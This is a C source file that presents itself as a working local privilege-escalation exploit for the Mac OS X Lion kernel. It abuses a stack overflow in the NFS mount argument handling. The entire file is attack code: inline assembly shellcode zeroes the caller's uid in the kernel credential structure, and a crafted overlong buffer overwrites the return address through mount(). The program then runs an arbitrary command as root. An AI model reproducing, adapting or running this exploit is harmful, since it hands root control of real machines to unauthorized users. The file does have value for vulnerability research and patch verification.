/*
 * Apple Mac OS X Lion Kernel <=  xnu-1699.32.7 except xnu-1699.24.8 NFS Mount Privilege Escalation Exploit
 * CVE None
 * by Kenzley Alphonse <kenzley [dot] alphonse [at] gmail [dot] com>
 *
 *
 * Notes:
 *  This exploit leverage a stack overflow vulnerability to escalate privileges.
 *  The vulnerable function nfs_convert_old_nfs_args does not verify the size 
 *  of a user-provided argument before copying it to the stack. As a result by
 *  passing a large size, a local user can overwrite the stack with arbitrary 
 *  content.
 *
 * Tested on Max OS X Lion xnu-1699.22.73 (x86_64)
 * Tested on Max OS X Lion xnu-1699.32.7  (x86_64)
 *
 *   Greets to taviso, spender, joberheide
 */
  
#include <stdio.h>
#include <stdlib.h>
#include <strings.h>
#include <errno.h>
#include <sys/mman.h>
#include <sys/mount.h>
#include <sys/param.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>
  
/** change these to fit your environment if needed **/
#define SSIZE       (536)
  
/** struct user_nfs_args was copied directly from "/bsd/nfs/nfs.h" of the xnu kernel **/
struct user_nfs_args {
    int     version;    /* args structure version number */
    char*   addr __attribute__((aligned(8)));       /* file server address */
    int     addrlen;    /* length of address */
    int     sotype;     /* Socket type */
    int     proto;      /* and Protocol */
    char *  fh __attribute__((aligned(8)));     /* File handle to be mounted */
    int     fhsize;     /* Size, in bytes, of fh */
    int     flags;      /* flags */
    int     wsize;      /* write size in bytes */
    int     rsize;      /* read size in bytes */
    int     readdirsize;    /* readdir size in bytes */
    int     timeo;      /* initial timeout in .1 secs */
    int     retrans;    /* times to retry send */
    int     maxgrouplist;   /* Max. size of group list */
    int     readahead;  /* # of blocks to readahead */
    int     leaseterm;  /* obsolete: Term (sec) of lease */
    int     deadthresh; /* obsolete: Retrans threshold */
    char*   hostname __attribute__((aligned(8)));   /* server's name */
    /* NFS_ARGSVERSION 3 ends here */
    int     acregmin;   /* reg file min attr cache timeout */
    int     acregmax;   /* reg file max attr cache timeout */
    int     acdirmin;   /* dir min attr cache timeout */
    int     acdirmax;   /* dir max attr cache timeout */
    /* NFS_ARGSVERSION 4 ends here */
    uint    auth;       /* security mechanism flavor */
    /* NFS_ARGSVERSION 5 ends here */
    uint    deadtimeout;    /* secs until unresponsive mount considered dead */
};
  
/** sets the uid for the current process  and safely exits from the kernel**/
static void r00t_me() {
    asm(
        // padding
        "nop; nop; nop; nop;"
  
        // task_t %rax = current_task()
        "movq   %%gs:0x00000008, %%rax;"
        "movq   0x00000348(%%rax), %%rax;"
         
        // proc %rax = get_bsdtask_info()
        "movq   0x000002d8(%%rax),%%rax;"
         
        // ucred location at proc
        "movq   0x000000d0(%%rax),%%rax;"
         
        // uid = 0
        "xorl   %%edi, %%edi;"     
        "movl   %%edi, 0x0000001c(%%rax);"
        "movl   %%edi, 0x00000020(%%rax);"
         
        // fix the stack pointer and return (EACCES)
        "movq   $13, %%rax;"
        "addq   $0x00000308,%%rsp;"
        "popq   %%rbx;"
        "popq   %%r12;"
        "popq   %%r13;"
        "popq   %%r14;"
        "popq   %%r15;"
        "popq   %%rbp;"
        "ret;"
        :::"%rax"
    );
}
  
int main(int argc, char ** argv) {
    struct user_nfs_args xdrbuf;
    char * path;
    char obuf[SSIZE];
  
  
    /** clear the arguments **/
    memset(&xdrbuf, 0x00, sizeof(struct user_nfs_args));
    memset(obuf, 0x00, SSIZE);
  
    /** set up variable to get path to vulnerable code **/
    xdrbuf.version = 3;
    xdrbuf.hostname = "localhost";
    xdrbuf.addrlen = SSIZE;
    xdrbuf.addr = obuf;
     
    /** set ret address **/
    *(unsigned long *)&obuf[528] = (unsigned long) (&r00t_me + 5);
    printf("[*] set ret = 0x%.16lx\n", *(unsigned long *)&obuf[528]);
         
    /** create a unique tmp name **/
    if ((path = tmpnam(NULL)) == NULL) {
        // path can be any directory which we have read/write/exec access
        // but I'd much rather create one instead of searching for one
        perror("[-] tmpnam");
        exit(EXIT_FAILURE);
    }
     
    /** make the path in tmp so that we can use it **/
    if (mkdir(path, 0660) < 0) {
        perror("[-] mkdir");
        exit(EXIT_FAILURE);
    }
     
    /** inform the user that the path was created **/
    printf("[*] created sploit path%s\n", path);
     
    /** call the vulnerable function **/
    if (mount("nfs", path, 0, &xdrbuf) < 0) {
        if (errno == EACCES) {
            puts("[+] escalating privileges...");
        } else {
            perror("[-] mount");
        }
         
    }
     
    /** clean up tmp dir **/
    if (rmdir(path) < 0) {
        perror("[-] rmdir");
    }
     
    /** check if privs are equal to root **/
    if (getuid() != 0) {
        puts("[-] priviledge escalation failed");
        exit(EXIT_FAILURE);
    }
     
    /** get root shell **/
    printf("[+] We are now uid=%i ... your welcome!\n", getuid());
    printf("[+] Dropping a shell.\n");

    /** execute **/
    execl("/bin/sh", "/bin/sh", "-c", argv[1], NULL);
    return 0;
}
